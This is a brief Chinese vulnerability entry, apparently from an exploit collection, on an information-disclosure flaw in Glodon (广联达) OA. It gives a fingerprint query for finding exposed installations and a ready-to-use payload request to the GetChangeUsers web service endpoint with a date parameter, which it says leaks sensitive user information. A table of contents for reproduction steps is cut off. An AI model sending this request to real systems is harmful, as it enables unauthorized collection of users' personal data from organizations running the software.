# 广联达OAGetChangeUsers存在信息漏洞

广联达 ｜ 其他 ｜ —
- **指纹**：`app.name="广联达 OA"`

**Payload**
```
可通过修改时间获取敏感信息
/Org/service/Service.asmx/GetChangeUsers?strDate=2023-01-02
>
```
- **其他**：广联达OA GetChangeUsers 存在信息漏洞: + 一、漏洞简介
+ 二、影响版本
+ 三、资产测绘
+ [四、漏洞复现](#%E5%9B%9B%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E